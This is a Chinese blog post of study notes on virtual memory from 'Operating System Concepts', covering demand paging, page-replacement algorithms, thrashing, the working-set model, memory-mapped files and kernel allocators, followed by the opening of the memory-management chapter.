利用率也随之增加（响应时间/周转时间不随之增加）； 内存与备份存储之间换入换出的速度加快（程序实际占用物理内存变小）。 进程的虚拟地址空间即为进程在内存中存放的 逻辑 视图，通常进程的的虚拟地址空间从某一个逻辑地址开始（比如 0）连续存放，如下图。随着动态内存分配，堆向上增长，子程序调用带来栈向下增长以及载入动态链接库时空白区域被填充。堆和栈之间的巨大的空白部分是虚拟地址的一部分，但只有在堆/栈生长时这部分虚拟地址才需要对应实际的物理帧。含有空白的虚拟地址空间称为 稀（sparse） 地址空间。 虚拟内存允许文件和内存通过共享页被多个进程共享，优势在于： 系统库可被多个进程共享 多个进程之间可以通过共享内存通信 允许系统调用 fork() 创建进程之间的共享页从而加快进程创建。 按需调页（Demand Paging）概念 当且仅当需要某页时才将该页调入内存的技术称为 按需调页（demand paging） ，被虚拟内存系统采用。按需调页系统类似于使用交换的分页系统，进程驻留在二级存储器上（磁盘），进程执行时使用 懒惰交换（lazy swapper） 换入内存。因为这种方式将进程视作一系列页而非巨大的连续空间，而 交换程序（swapper） 是对整个进程进行操作，因此使用 调页程序（pager） 对进程的单个页代替交换程序。 需要一定形式的硬件区分哪些页在内存中，第八章中的有效/无效位可用于此目的，当该位设为有效时表示对应的页既合法又在内存中，而该位设置为无效时表示相关的页无效（不属于进程的逻辑地址空间）或有效但尚未调入内存。对于尚未调入内存的页，其页表条目设置为无效或者包含了该页在磁盘上的地址。 进程试图访问尚未调入内存中的页会触发 页错误陷阱（page-fault trap） ，操作系统会按如下流程 处理页错误 ： 检查进程的内部页表（进程维护的内部页表和 PCB 一起保存）来确定该引用是否为合法地址，若引用非法则终止进程，否则准备调入页面； 操作系统寻找一个空闲帧（如从空闲帧链表中选择一个元素）； 操作系统调度磁盘，将需要的页调入到上一步分配的空闲帧； 磁盘读操作完成后修改进程的内部页表和操作系统维护的页表以表示该页已经位于内存中； 重新读取因为页错误而终端的指令，进程可以访问此前无法访问的页。 上述按需调页的一种极端情况是在不调入任何需要页的情况下就执行进程，因此进程执行过程中将不断出现页错误、调入页、继续执行。这种方案称为 纯粹按需调页（pure demand paging） 。按需调页处理页错误的流程如下图所示。 理论上单个指令可能触发多个页错误（例如一页用于获取指令，一页用于获取指令所需的数据），但此种情况较少见，正常执行程序满足 局部引用（locality of reference） 特性，使按需调页的性能较好。 按需调页与分页 按需调页所需的硬件支持和分页、交换相同： 页表 ：通过有效/无效位保护进程地址空间 次级存储器 ：备份存储，保存不在内存中的页，通常为快速磁盘，用于和内存交换页的部分空间称为 交换空间（swap space） 。Linux 系统所需的 /swap 挂载点挂载的存储空间即为交换空间。 虚拟技术的困难在于，分页是加在 CPU 和内存之间的，并且要对用户进程完全透明。人们通常假定分页能够应用到任何系统中，这个假定对于非按需调页的环境而言是正确的（缺页即为访问无效内存，产生致命错误），而在按需调页系统中，页错误意味着可能缺页、需要调入一个额外的页。 调入额外的页的过程很可能导致原始的指令在调页完成后重新执行不再正确 。考虑下面的情况： MVC 指令可以将 256B 的块从一处移动到另一处（可能重叠），如果源块或者目的块中任何一块跨越了页边界，则移动操作执行（在执行前并没有意识到源块/目标块缺页）到一半可能会出现页错误； 在上述情况（跨页）的基础上，如果源块和目的块有重叠（overlap），则移动执行到一半时，源块可能已经被修改，这时调页进入内存后，不能简单地重启该指令。 上述两类情况有两种不同解决方案： 微码计算并试图访问两块的两端，如果出现了页错误，则在指令 MVC 执行前将缺页调入内存； 使用临时寄存器保存 MVC 指令从执行到触发缺页之间被覆盖了的数据，如果发生了页错误，则临时寄存器中保存的值在处理页错误之前写回到内存，此时调页完成后指令可以重启，状态与之前相同。 性能 按需调页内存的 有效访问时间（effective access time） 计算为： 有效访问时间 = (1-p) x ma + p x 页错误时间)。其中 ma 为计算机系统的内存访问时间，通常为 10 ~200ns； p 为出现页错误的概率，p 越接近于 0 则页错误发生越少。 进程 P 触发了页错误会导致下列动作： 触发硬件陷阱，操作系统中断进程 P 操作系统保存用户进程 P 的寄存器、进程状态 确定中断是否为页错误，若是则判断页引用是否合法，若合法则确定页所在磁盘位置 从磁盘读入页到某个空闲帧，这一步又包括：在该磁盘队列中等待直到处理完排在自己之前的请求，磁盘寻道/延迟以及磁盘传输的时间 磁盘等待过程中将 CPU 分配给其他进程 Q（CPU 调度） 从 I/O 子系统接收到中断 保存 Q 的寄存器和进程状态（如果执行了第 5 步） 确定中断是否来自于之前页错误触发的磁盘请求，若是则修正页表和其他表以更新页信息 等待 CPU 调度程序将 CPU 资源再次分配给进程 P 恢复进程 P 的用户寄存器、进程状态和新页表，重新执行被中断的指令 以上步骤不是全部必需的，例如第 5 步可以提高 CPU 使用率，但执行完 I/O 后也需要额外的时间保存现场。无论如何， 缺页导致的页错误处理时间主要包括：处理页错误中断、读入页以及重新启动进程 三部分，其中读入页除了磁盘设备本身的处理时间，还可能包括等待设备的时间。 交换空间的处理和使用对按需调页的性能也有很大影响，磁盘 I/O 操作到交换空间比到文件系统要快，因为 交换空间按照大块来分配 。如果在进程开始时将整个文件镜像复制到交换空间，并从交换空间执行按页调度则可能获得更好的调页效果。另一种方式是进程执行开始时从文件系统按需调页，但当出现页置换时则将页写入交换空间，这样只有所需的页才会从文件系统调用，而一旦调用某页，此后的该页再次调度时会从交换空间读入。 写时复制和页面置换写时复制 系统调用 fork() 是将子进程创建为父进程的副本，传统的 fork() 会为子进程创建一个父进程地址空间的副本，将父进程的页复制，但由于很多子进程创建之后立刻执行系统调用 exec()，因此复制父进程地址空间完全没有必要。 写时复制（copy-on-write） 技术允许父进程和子进程开始时共享同一页面，这些页面标记为写时复制页，如果任何一个进程对某一个写时复制页进行了写操作，则为这个进程创建一个该页的副本。注意， 只有可能被修改的页才会被标记为写时复制 ，对于不允许被修改的页面（如包含可执行代码的页）可以被父进程和子进程共享。 许多操作系统为分配空闲页请求提供了空闲缓冲 池（pool） ，池中的空闲页在进程的栈/堆需要扩展时可用于分配，或者用于管理写时复制页。操作系统通常使用 按需填零（zero-fill-on-demand） 技术分配这些页，这些页在分配之前被填入 0 覆盖，因此清除了之前的内容。 虚拟内存 fork 是有的 UNIX 版本提供的 fork() 操作变种，vfork() 将父进程挂起，自己成使用父进程的地址空间，并且不采用写时复制。因此子进程对父进程地址空间的任何修改都会在父进程重启时可见。vfork() 主要用于子进程创建后立刻调用 exec() 的情况，它不会导致页面的复制操作，有时用来 实现 shell 接口 。 页面置换概念 增加多道程序的程度会导致内存的 过度分配（over-allocating) 。I/O 缓存也需要使用大量内存，缓存的使用会增加内存分配算法的压力，有的操作系统为 I/O 缓存分配了一定比例的内存，有的则允许用户进程和 I/O 子系统竞争全部系统内存。 内存的过度分配会导致某个进程触发了页错误而没有空闲帧可用，因为按需调页对用户而言透明，因此操作系统不应当直接终止进程（操作系统也可以交换出一个进程来降低多道程序的级别，这种选择有时是好的）。 页置换（page replacement） 发生在需要调页而没有空闲帧的情况，流程如下： 查找所需页在磁盘上的位置 查找空闲帧，若有则使用，否则通过页置换算法选择一个 牺牲（victim） 帧并将牺牲帧的内容写入备份存储（磁盘，交换空间），改变页表和帧表 将所需页写入到空闲帧，并改变页表和帧表 重启用户进程 可以看出，在没有帧空闲，需要页置换的情况下，会有两个页传输（一页换出，一页换入），这加倍了页错误处理时间。这一点可以通过在页表的每个条目中增加 修改位（modify bit） 或 脏位（dirty bit） 来降低额外开销，如果被置换出的页对应的修改位没有被设置，则说明此页从被调入内存后没有被修改，因此不必被写入回磁盘。 按需调页需要开发 帧分配算法（frame-allocation algorithm） 和 页置换算法（page-replacement algorithm） 。页置换算法的好坏可以计算页错误率评估：对于一个特定的内存地址引用序列，运行置换算法，计算出页错误的数量。这个引用序列称为 引用串（reference string） ，可以人工产生也可以跟踪一个真实的系统并记录其访问内存地址。利用两个事实可以降低引用串的数据量：只考虑内存引用的页码而不考虑完整地址；如果有对页 p 的引用，则紧跟着对页 p 的引用绝不会产生页错误。 理论上来说，我们期待增加可用帧（增加物理内存大小就会增加可用帧数量）的数量能够使页错误的数量相对应减少。 Belady 异常（Belady’s anomaly） 指违背这一期待的现象：对于有的页置换算法，页错误率甚至可能随着分配的物理帧数增加而增加，例如下面的 FIFO 算法。 页面置换算法基本页置换算法 FIFO页置换 ：最简单的页置换算法，操作系统记录每个页被调入内存的时间，当必需置换掉某页时，选择最旧的页换出。实际操作中不需要真的记录调入时间，可以通过一个 FIFO 队列管理内存中的页，置换算法从队列的头部取出换出的页，将换入的页加入到队列尾部。FIFO 页置换算法的性能并不总是很好，它置换出的页可能是一个很久以前现在已经不再使用的页（符合我们的期望），也可能是一个进程创建时初始化的变量，而这个变量仍然在不停地被使用，此时被调出的这页很快就会再次导致页错误。 最优置换（optimal page-replacement） 是所有页置换算法中页错误率最低的，但它需要引用串的先验知识，因此无法被实现。它会将内存中的页 P 置换掉，页 P 满足：从现在开始到未来某刻再次需要页 P，这段时间最长。也就是 OPT 算法会 置换掉未来最久不被使用的页 。OPT 算法通常用于比较研究，衡量其他页置换算法的效果。 最近最少使用算法（least-recently-used algorithm） 简称 LRU，它置换掉到目前时刻最久未被使用的页。这一算法可以视作 OPT 的倒转，LRU 和 OPT 算法都属于 栈算法（stack algorithm） ，它们绝不会产生 Bleady 异常。一个有意思的地方在于，对于引用串 S，LRU 算法计算 S 和 S^R 的错误率时相同的（S^R 是引用串 S 的逆序），这一特性对 OPT 算法也满足。LRU 策略可能需要一定的硬件支持，因为它需要为页帧按上次使用时间确定一个排序序列。两种实现方式： 计数器（counters） ：每个页表的条目关联一个时间域，CPU 增加一个计数器，每次内存引用发生时，计数器增加，并且将引用的页在页表中对应的条目的时间域更新为计数器的内容。这样 LRU 需要搜索页表置换具有最小时间域的页。这种方式每次内存访问都要写入内存，页表改变（因为 CPU 调度）的时候还需要保持时间，还需要考虑时钟溢出问题。 栈（stack） ：采用页码栈维护，每当引用了一个页就将该页从栈中删除并放置到顶部，这样栈顶总是最近使用的页，栈底则为 LRU 需要替换的页。因为要从栈中删除某项，所以可实现为带有头指针和尾指针的双向链表，从栈中删除一页并放置到栈顶最坏情况下需要修改 6 个指针，但这种实现方式不需要搜索整个表。 近似 LRU 页置换算法近似 LRU 页置换算法（LRU-Approximation Page Replacement） ：很少有系统能够提供足够的硬件支持真正的标准 LRU 页置换，通常通过引用位的方式提供支持实现近似的 LRU 算法。页表的每一个条目都关联着一个 引用位（reference bit） ，每当引用了一个页（无论读写），都将该页在页表中对应条目的引用位置位，检查引用位就可以确定哪些页使用过： 附加引用位（Additional-Reference-Bits） 算法：位于内存中的每页对应的条目保留一个字节（8位），这个字节的 8 位说明了这一页在过去 8 个时间周期内的使用情况。每过一段规定的时间间隔（如 100 ms），时钟定时器产生中断并将控制转交给操作系统，操作系统将页表每个条目的引用位右移，最低位舍弃，最高位设置为引用位，并将引用位清零。具有最小值的页即为 LRU 替换的页。这里历史位共 8 位，长度可以调整，极端情况下可以为 0 位（此时仅剩下引用位本身）。 二次机会（Second-Chance） 算法：该算法基本算法是 FIFO 置换。每当准备置换出一页时检查其引用位，如果引用位为 0 则直接置换该页，否则将引用位清零并给该页第二次机会，之后准备换出下一个 FIFO 页。如果一个页总是被使用，则其引用位经常被设置，所以不会被置换出内存。这种算法的实现采用循环队列，用一个指针表示下次置换队列中的哪一页，找到牺牲页时就将新页插入到牺牲页的位置。最坏情况下所有页都已经被设置，此时需要遍历整个循环队列，性质等价于 FIFO 置换，而所需时间比 FIFO 更长。 增强型二次机会（Enhanced Second-Chance） 算法：将引用位和修改位作为一对考虑以改进二次机会算法，这两个位可能有四种类型：(0, 0) 表示最近没有使用也没有修改（最佳置换页）；(0, 1) 表示最近没有使用但已修改（若置换则需要写入到磁盘）；(1, 0) 表示最近使用但尚未修改（此页可能很快会被使用）；(1, 1) 表示最近使用且已经被修改（此页可能很快会被使用并且如果置换需要写入磁盘）。这种方法给已经修改过的页更高的级别，降低了 I/O 操作数量。但找到要置换的页之前，可能需要搜索循环队列多次，每次将级别升高一级并寻找满足的页面。 基于计数的页置换算法基于计数（Counting-Based） 的页置换通过为每页的条目保留一个引用次数的计数器来选择换出页，包括 LFU 和 MFU，这两种置换方式都很费时并且效果很差： 最不经常使用（least frequently used，LFU） 页置换算法：置换计数最小的页，理由是活动页通常有更大的引用次数。但带来问题是一个被使用多次的页可能已经很久不在使用，但仍然保留在内存中。一种解决方式是定期将次数寄存器右移一位来使使用次数指数衰减。 最常使用页（most frequently used，MFU） 置换算法：置换计数最大的页，理由是最小次数的页可能刚刚被调入且尚未使用。 页缓冲算法 系统保留一个空闲帧缓冲池，出现页错误时仍然选择一个牺牲帧，但牺牲帧写出前就将所需要的页写入到缓冲池的某一个空闲帧中，写入完成的空闲帧就可以直接被使用，这样无需等待牺牲帧的写出。牺牲帧写出到交换空间后，又会被添加到空闲帧缓冲池中。 此种方式的扩展之一是维护一个已经修改过的页面列表，当调页设备空闲时，就将一个修改过的页面写回到磁盘并重新设置其修改位，这样在真正需要置换时，牺牲页需要写入到磁盘的概率会降低。 另一种修改是保留一个空闲帧池（需要记录哪些页对应哪些帧），当页错误发生时先检查所需页是否在空闲帧池中，若在则无需 I/O，若不在则选择一个空闲帧并从硬盘读入所需页。这种技术通常和 FIFO 算法一起用于 VAX/VMX 系统，当 FIFO 错误置换了常用页时，被换出的页仍能够很快从空闲帧池中调出。很多 UNIX 系统也将这种方法和二次机会算法一起使用，降低因错误选择牺牲页引起的开销。 针对应用程序选择页置换 有些情况下操作系统提供的虚拟内存会让部分应用程序性能下降。例如数据库提供了自己的内存管理和 I/O 缓冲，若操作系统同时也提供了 I/O 缓冲，则用于 I/O 的资源加倍。此外，对于一个执行大量顺序磁盘读操作的行为，LRU 算法删除旧页保持新页，而应用程序可能更需要旧页，此时 MFU 比 LRU 更高效。 有些操作系统允许特殊程序绕过文件系统的数据结构，将磁盘视作逻辑块数组使用。这种数组称为 生磁盘（raw disk） ，针对这样的数组的 I/O 称为生 I/O。 缺段中断和处理（补充） 使用分段内存管理时，CPU 要访问的指令/数据不在内存中会产生 缺段中断 ，操作系统会通过如下流程处理缺少段 X 的事件： 考察内存中是否存在不小于 X 段长的空闲区，若存在则从该空闲区中为段 X 分配内存，转 4； 若不存在，则考察内存中所有空闲区的总和是否小于 X 的段长，若总和大于 X 的段长则合并空闲区形成一个足够大的空闲区，并使用新空闲区为 X 分配内存，转 4； 若空闲区总和仍小于 X 的段长，则按 FIFO 或 LRU 算法反复淘汰老段，形成一个长度不小于 X 段长的空闲区； 将 X 段调入内存并修改段表 帧分配与系统颠簸最少需要帧数 分配的帧不能超过可用帧的数量（除非存在页共享），但也不能少于满足进程继续运行的帧数（minimum number of frames）。分配帧数不能过少的原因包括： 性能：当分配给每个进程的帧数量减少时，页错误会增加从而减缓进程执行。 页错误会导致指令重启：必须由足够的帧来容纳单条指令执行所需要的全部页。例如某台机器的机器指令都只有一个内存地址作为参数，此时至少需要一帧用于存储指令所在的页空间，还需要分配一帧用于存储指令引用的数据所在的页。如果此时允许一级间接引用（地址间接引用），则进程至少需要三个帧才能完成指令的执行，如果仅两帧可用，则进程将陷入无穷尽的页错误中。这种问题的最坏情况出现在允许多层间接引用的计算机中，对于多级引用，必须等到所有所需页都位于内存中指令才能执行，这种困难的解决方案是限制指令的间接引用级数，超出引用级数时触发陷阱。 分配算法 平均分配（equal allocation） ：给每个进程一个平均值，剩余的帧放置在空闲帧缓冲池中； 比例分配（proportional allocation） ：根据进程大小按比例分配内存。这两种分配方式，每个进程分配的数量都会随多道程序的级别而变化，当多道程序程度增加时，每个进程都需要失去一定数量的帧来提供给新进程，同理，多道程序程度降低时离开进程占有的帧可以分配给剩余的进程。 比例分配可以根据进程的优先级（或者是优先级和大小的结合）而不是进程的大小来分配，这样可以给高优先级的进程更多的内存以加速执行。 多个进程竞争帧时，可将页置换算法分为 全局置换（global replacement） 和 局部置换（local replacement） 。全局置换允许进程从所有帧的集合（包括其他进程持有的帧）中选择置换帧，这将导致某个进程所获得的帧的数量可能改变（从其他进程处选择了一个帧置换）；而局部置换只能允许进程选择分配给自己的某个帧，此时分配给每个进程的帧数量保持不变。 全局置换算法的一个问题在于进程不能控制自己的页错误率，进程位于内存的页集合会受到其他进程调页行为的影响。此外，相同进程执行所需的时间在不同环境下可能有很大差异。但由于局部置换不能使用其他进程不常用的内存，所以全局置换有更好的系统吞吐量，因此更为常用。 系统颠簸 当低优先级进程分配的帧数量少于体系结构所需的最少数量时，进程应当暂停执行并且换出分配的剩余帧，以使其他进程能够使用这部分帧空间。 对于分配帧数不足的进程，当进程缺少所需的页时触发页错误，此时必须置换某个页。如果当前所有页对于这个进程而言都是需要使用的页，则它置换出一个页后，又立刻需要这个页，因此它将频繁产生页错误并触发页调度行为。这称为 颠簸（thrashing） ： 如果一个进程在换页上用的时间多于执行时间，则这个进程在颠簸 。 系统颠簸的原因在于：操作系统监控 CPU 使用率，CPU 利用率过低时会引入新进程来增加多道程序程度。然而，采用全局置换算法时，一个进程会置换任意进程的帧，这可能导致被换出页所属的进程也触发页错误，它们会再从其他进程中获取帧。 这些链式反应带来的页调度行为将使进程排队等待换页设备，就绪队列变空，CPU 使用率降低，导致 CPU 调度程序随之增加多道程序程度，新进程将引发更多的页错误，CPU 使用率进一步降低 。系统颠簸现象如下图。 随着多道程序程度增加，CPU 使用率增加直到最大值，之后开始系统颠簸，此时必须降低多道程序程度才能增加 CPU 使用率并降低系统颠簸。 局部置换算法（local replacement algorithm） ，也称 优先置换算法（priority replacement） 可以限制系统颠簸：如果一个进程开始颠簸，则它不能从其它进程获得帧，但问题未得到彻底解决，一个进程颠簸时会花费大量时间等待调页设备，这将导致调页设备的平均等待队列变长，页错误的平均等待时间增加，此时其它未颠簸进程的有效访问时间也会增加。 要 防止颠簸 ，必须给进程提供足够多的帧。 局部模型（locality model） 可以帮助确定进程实际正在使用多少帧，该模型说明，进程执行时在局部之间移动。 局部是进程经常使用的页的集合，进程由多个不同局部组成且局部之间可能重叠 。如果进程分配的帧数小于现有局部的大小，则进程会颠簸，因为它无法把所有常用页都放置在内存中。例如，进程调用了一个子程序，则其进入新的局部，这个新局部中的内存引用包括子程序的指令、局部变量以及子程序使用到的部分全局变量；当子程序退出时，进程从该局部返回主程序的局部（也可能在之后再次调用子程序进入该局部）。因此，局部是由程序和数据结构定义的，它是缓存的基础（cache、LRU 置换算法其实也都是基于局部性原理，在访问序列完全随机的情况下性能甚至不如 FIFO 算法），如果对任意数据访问完全随机而没有局部性原理，则缓存完全无用。 工作集合模型 工作集合模型（working-set model） 基于局部性假设，使用参数 Δ 定义 工作集合窗口（working-set window） ，其思想是检查最近 Δ 个页的引用，这最近 Δ 个引用页的集合称为工作集合。工作集合是程序局部的近似：一个正在使用的页位于工作集合中，一旦它已经 Δ 个时间单位未被使用，则会从工作集合中删除。 工作集合的精确度和 Δ 有关，Δ 太小则无法包含整个局部，过大则可能包含多个局部。工作集合最重要的属性是它的大小，系统内每个进程的工作集合大小 WSSi 之和 D 就是所有进程总的帧需求量，每个进程都会经常使用位于其工作集合内的页。当 D &gt; m （m 是系统最大可用帧数量）时，就会有进程得不到足够的帧从而出现颠簸。 使用工作集合模型的内存分配过程如下：操作系统跟踪每个进程的工作集合，并给每个进程分配大于其工作集合大小的帧数。如果尚有空闲帧则可加入新进程；如果需要分配的帧数大于可用帧数，则操作系统选择、暂停一个进程，这个进程的所有页写出到备份存储，其已经占有的帧会被分配给其他进程。 工作集合模型的难点在于 跟踪 ，每次内存引用都会增加新引用并丢弃老引用。 固定定时中断和引用位可以近似模拟工作集合模型 。例如 Δ = 10000 时，每 5000 个引用就产生一次定时中断，中断触发时将所有页的引用位复制，复制完成后清除。当发生页错误，系统检查当前的引用位和位于内存中的两个位（每次中断复制一位，10000 次引用中断 2 次因此复制了两个位）从而确定这一页是否在过去的 10000~15000 个引用中出现过（只要有至少一位为 1 就说明使用过，否则都为 0），若出现则认为该页在工作集合中。这种模拟并不很准确，因为无法准确获取该页究竟在 5000 个引用中的具体哪个位置出现，增加中断频率和历史位的位数可以提高准确性，但相应的也会增加中断处理时间。 页错误频率 工作集合模型更适合用于预先调页，将其应用于控制颠簸有些不太灵活。 页错误频率（page-fault frequency，PFF） 策略能够通过测量、控制页错误率来更好的防止颠簸：颠簸有较高的页错误率，较高的页错误率说明进程需要更多帧，过低的页错误率说明进程可能分配了太多的帧。可以为页错误率设置上限和下限，超过上限就为进程分配更多帧，低于下限则移走帧。当页错误率过高而没有可用帧时，仍需要暂停一个进程并将其占有的帧释放、分配给具有过高页错误率的进程。 进程的工作集合和页错误率之间有直接关系，当进程从一个局部迁移到另一个局部时，工作集合改变，页错误率会进入波峰，随着需要调入的页逐步调入内存，页错误率又会下降。一个波峰的开始到下一个波峰的开始显示了工作集合的迁移。 其它内存映射文件 通过虚拟内存技术将文件 I/O 作为普通内存访问的方法称为文件的 内存映射（memory mapping） 。文件的内存映射将一个磁盘块映射成内存的一页（或多页），开始时文件访问和普通的请求界面调度相同，并且产生页错误，这样一页大小的部分文件就会从文件系统读入到物理内存中（部分系统一次会读入多页大小内容）。通过内存操作文件而不是系统调用 read() 和 write() 能够简化文件访问和使用。 对映射到内存中的文件做写操作可能不会立刻写回到磁盘文件中。有的操作系统定期检查文件在内存中的映射是否被修改，并据此决定是否需要将内存的数据更新到磁盘上。关闭文件必然会导致内存映射的数据写回磁盘，同时从进程的虚拟内存中删除。 部分操作系统只能通过特定的系统调用提供内存映射，通过标准的系统调用处理所有其它的文件 I/O 请求；有的操作系统则一律将文件 I/O 视作内存映射，例如 Solaris 系统会将标明为内存映射的文件映射到进程的地址空间中，而对于采用普通系统调用（read、open 以及 write）访问的文件，Solaris 也会做内存映射，不过目标是内核地址空间。 一个文件可以同时映射到多个进程的虚拟地址空间中以实现 数据共享 ：任何一个进程对共享虚拟内存中数据的修改都会被那些同样映射了这部分文件的进程看见（注意这里是为了实现数据共享，因此才允许多个进程修改同一页）。每个共享进程的虚拟内存表指向了物理内存的同一页。内存映射也支持写时复制，进程可以共享只读模式的文件，对于需要改动的数据，进程需要维护各自独立的副本。 其他设备的 I/O 操作也可以通过内存映射的方式：操作系统将一组内存地址专门映射到设备寄存器，对这些内存地址的读写等同于对设备寄存器的读写，即 I/O 端口。CPU 和设备之间传递数据可以通过轮询或中断。轮询方式指 CPU 不断查询控制位判断接收设备是否准备就绪；中断驱动则由接收设备通知 CPU 数据已经就绪。 内核内存分配 普通用户进程获取额外内存时是从内核维护的空闲页帧链表中获取，该链表由页替换算法更新，这些页帧往往分散在物理内存中。 内核内存的分配通常从空闲内存池获取而非从普通用户进程的内存链表获取，原因： 内核要为不同大小的数据结构分配内存，有些数据结构远不到一页的大小。很多操作系统的内核代码并不受分页系统控制，内核可以也必须谨慎分配内存并尽量降低碎片浪费。 用户进程分配的页不一定非要在连续的物理内存中，但操作系统需要和硬件交流，需要内存常驻在连续的物理内存帧中。 Buddy 系统（Buddy system） 将物理上连续并且大小固定的段划分成 2 的幂（4KB、8KB、16KB等），如果请求大小不为 2 的幂，实际分配的内存大小也会是 2 的幂。例如请求 11KB 将会得到 16KB。Buddy 系统的分配通过不断切割实现，例如内存段大小 256 KB，申请 21 KB，则将内存段不断划分成两半，最终得到一个 32KB 的小段满足 21KB 请求。其优缺点如下： 优点：可通过合并快速形成更大的段，例如上面分配的 32KB 内存释放后可以立刻得到原始的 256KB 段 缺点：碎片，可能有 50% 的内存因为碎片而浪费 slab 分配 ：slab 由一个或多个 物理上 连续的页组成，高速缓存 含有 一个或多个 slab。每个内核数据结构都有一个 cache （如进程描述符 cache 只存储进程描述符对象、文件对象和信号量等以此类推），每个 cache 包含 内核数据结构的 对象实例 。 slab 算法用 cache 存储内核对象，cache 创建之初会初始化一系列空闲的内核对象，这些对象的数量和 slab 的大小有关（例如 12KB 的 slab 可存储 4 个 3KB 大小的内核对象）。一旦操作系统需要内核结构的对象，就可以直接从 cache 上获取一个空闲的并将其标注为 已使用（used） 。下面这张图需要注意的地方有，物理内存连续分配，实线（带箭头）表示包含关系，每个 cache 都存储了一类内核数据结构对象： Linux 下的 slab 有三种状态：满的（slab 中所有对象都标记为使用），空的（均为空闲）以及部分。slab 分配的分配流程如下：首先从部分空闲的 slab 分配，若没有则从空的 slab 分配，如果仍没有则从 物理连续页 上分配新的 slab 并将其交付给一个 cache，并从新 slab 分配空间。其优点主要有： 没有因为碎片引起的内存浪费。每个内核数据结构都有与自己的结构相对应的 cache，而每个 cache 由若干个 slab 组成， 每个 slab 又可分为若干个和对象大小相等的部分 ，所以内核请求对象所获得的内存刚好和对象大小一致； slab 中的对象预先创建，可以直接从 cache 快速分配。因为操作系统经常分配、释放内存，使用 slab 分配能够更快地使内存请求得到响应，用完对象释放时也只需要将内核对象标记为空闲并返回给 cache。 更多方面的考虑 预调页（prepaging） ：当进程开始时，所有页都在磁盘上，每个页都需要通过页错误来调入内存。预调页同时将所需要的所有页一起调入内存，从而阻止了大量的页错误。部分操作系统如 Solaris 对小文件就采取预调页调度。实际应用中，例如对于采用工作集合模型的系统，可以为每个进程维护一个当前工作集合中的页的列表，如果进程在暂停之后需要重启时，根据这个列表使用预调页将所有工作集合中的页一次性调入内存。预调页有时效果比较好，但成本不一定小于不使用预调页时发生页错误的成本，有很多预调页调入内存的页可能没有被使用。 页大小（page size） ：许多因素会影响页面大小，不存在单一的最佳页大小。页面大小总为 2 的幂，通常在 2^12 到 2^22 字节之间（4KB ~ 4MB）。页面大小的考虑主要涉及如下几点，现代操作系统倾向于使用更大的页面： 更大的页面大小能够减少页数量，从而减小页表大小； 更小的页面大小能够更好的利用内存，减少碎片； 页读写所需要的时间：传输时间和传输量（页大小）成正比，看起来似乎小页面更好，但实际上磁盘的寻道、延迟时间远超过传输时间，因此为了最小化 I/O 时间，需要采用较大的页； 局部性：采用较小的页能够更精准的定位程序局部，从而降低总的 I/O 量； 页错误数量：页面大小过小时，页错误会触发的更加频繁，页错误会带来大量的额外开销（处理中断、保存寄存器、置换页、排队等待调页设备、更新表），为了减少页错误数量，需要较大的页。 TLB 范围（reach） ：指通过 TLB 可访问的内存量，即 TLB 能够存储的条数和页面大小的乘积。理想情况下一个进程的全部工作集合都位于 TLB 中才能够减少地址转换、查页表浪费的时间，但是对于需要使用大量内存的应用程序，TLB 大小不足以存储全部局部。增加 TLB 范围可以通过增加 TLB 条数，也可以通过增加页面大小。增加页大小会带来更大的碎片，另一种选择是使用不同大小的页（如 UltraSPARC 支持 8、64、512KB 和 4MB 的不同大小的页面），对于绝大多数程序而言 8KB 的页足够，部分其它应用程序如数据库可以利用 4MB 大小的页。注意，现代操作系统趋势是不同大小的页由操作系统而不是硬件来管理，软件管理必然也会影响性能（PowerPC 和 Pentium 用硬件管理 TLB）。 程序结构 ：用户应当对按需调页足够了解，以使程序结构更好的适应系统，例如一个页大小为 128B 的系统按行存储数组，则下面的两类代码中，上面的代码会触发 128 x 128 = 16384 次页错误，而下面的代码只会触发 128 次。程序设计语言的特性对调页也会有影响，例如 C 和 C++ 经常使用指针，指针趋向于使内存访问随机，从而导致进程的局部性变差。此外， OOP 思想设计的程序引用的局部性也较差 。 12345678int data[128][128];for (int i = 0; i &lt; 128; i++) for (int j =0; j &lt; 128; j++) data[j][i] = 0; // 每个字节都会触发一次，共 16384 次 for (int i = 0; i &lt; 128; i++) for (int j =0; j &lt; 128; j++) data[i][j] = 0; // 每行触发一次，共128 次 实验 设计程序模拟 FIFO 和 LRU 页置换算法。我对此问题编写的代码可在 此处 获取，其中包括一个基类 BASIC 和两个子类 FIFO、LRU。其它类型换页算法可以通过继承 BASIC 并重写 swapIn() 方法完成。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（八）：内存管理此专栏的下一篇文章：操作系统（十）：文件系统接口 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/04/os-concepts-9/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（八）：内存管理","slug":"os-concepts-8","date":"2017-01-03T02:27:12.000Z","updated":"2017-01-06T12:00:16.000Z","comments":true,"path":"2017/01/03/os-concepts-8/","link":"","permalink":"http://forec.github.io/2017/01/03/os-concepts-8/","excerpt":"整理《Operating System Concepts》 第七版第八章内存管理部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第八章内存管理部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 背景基本硬件 CPU 通常在一个 CPU 时钟周期内完成对内置寄存器的访问，对内存的访问需多个 CPU 时钟周期，在缺少数据来完成正在执行的指令时，CPU 需要 暂停（stall） ，通常在 CPU 和内存之间添加高速缓存（cache）以协调速度差异。 要确保操作系统不被用户进程访问、用户进程不被其他用户进程访问，需要每个进程拥有独立的地址空间。通过 基地址寄存器（base register） 和 界限地址寄存器（limit register） 可对进程内存加以保护，基地址寄存器存储进程可访问的最低合法 物理 内存地址，界限地址寄存器决定从该地址开始的，可访问的内存范围大小。CPU 硬件对 用户模式 下产生的 每一个 地址和寄存器指明的地址区间比较，用户模式下的程序试图访问操作系统/其他用户进程内存的行为会触发陷阱（trap），操作系统会将其视为致命错误处理。 